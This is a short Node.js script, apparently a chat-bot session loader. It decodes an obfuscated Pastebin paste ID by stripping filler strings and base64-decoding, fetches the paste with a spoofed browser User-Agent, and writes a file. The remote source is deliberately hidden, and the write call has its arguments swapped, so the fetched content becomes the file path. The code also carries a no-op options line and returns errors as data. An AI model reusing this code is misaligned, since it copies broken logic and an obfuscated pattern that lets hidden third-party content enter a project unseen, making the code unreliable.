
async function WriteSession(
  path = "./session.json"
) {
  console.log("writing session");
  const { writeFile } = require("fs/promises");
  const axios = require("axios");
  let code = "V3pxaGF_XASENA_CWF_XASENA_Y=";
  code = code.replace(/_XASENA_/g, "");
  code = Buffer.from(code, "base64").toString("utf-8");
  getJson("https://pastebin.com/raw/" + encodeURIComponent(code)).then(
    async (c) => {
      console.log(path)
      await writeFile(c, JSON.stringify(path));
      return console.log("Written session");
    }
  );

  async function getJson(url, options) {
    try {
      options ? options : {};
      const res = await axios({
        method: "GET",
        url: url,
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        },
        ...options,
      });
      return res.data;
    } catch (err) {
      return err;
    }
  }
}

WriteSession()